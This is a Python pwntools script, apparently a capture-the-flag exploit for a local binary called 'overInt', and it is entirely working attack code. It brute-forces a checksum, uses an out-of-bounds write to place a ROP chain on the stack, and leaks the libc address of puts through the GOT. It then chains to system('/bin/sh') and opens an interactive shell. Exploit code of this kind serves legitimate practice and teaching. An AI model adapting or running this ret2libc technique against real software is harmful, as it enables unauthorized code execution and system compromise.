from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./overInt")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./overInt")
else:
	p = process("./overInt")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./overInt")
	
def debugf():
	gdb.attach(p,"b *0x0000000000400AA1\nb *0x0000000000400862")

def setnum(n1,n2,n3,n4):
	p.sendafter("Please set arrary number: \n",chr(n1)+chr(n2)+chr(n3)+chr(n4))

def bruteforce():
	counts = 0
	for i1 in range(256):
		for i2 in range(256):
			for i3 in range(256):
				for i4 in range(-128,128,1):
					v3 = 0
					v3 = ((i1 >> 4) + 4*v3) ^ (i1 << 10)
					v3 = ((i2 >> 4) + 4*v3) ^ (i2 << 10)
					v3 = ((i3 >> 4) + 4*v3) ^ (i3 << 10)
					v3 = ((i4>>4) + 4*v3) ^ (i4 << 10)
					if v3 % 0x2f == 0x23:
						print v3
						print i1,i2,i3,i4
						counts += 1
						if counts > 3:
							assert 1==0

def sendropdata(ropdata):
	setnum(0,0,1,256-88)
	p.sendafter("How many numbers do you have?\n",p32(5))
	number = [0,0,0,0,0x20633372]
	for i in range(5):
		p.sendafter("the number {index} is: \n".format(index=i),p32(number[i]))
	p.sendafter("How many positions you want to modify?\n",p32(len(ropdata)))
	offset = 0x30+8
	for i in range(len(ropdata)):
		p.sendafter("Which position you want to modify?\n",p32(offset+i))
		p.sendafter("What content you want to write in?\n",ropdata[i])
	

context.log_level = "debug"
debugf()
pop_rdi_ret = 0x0000000000400b13
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main_addr = 0x40087F
ropdata1 = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
sendropdata(ropdata1)
p.recvuntil("hello!")
puts_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
ropdata2 = p64(pop_rdi_ret) + p64(binsh) + p64(system_addr)
sendropdata(ropdata2)
p.interactive()
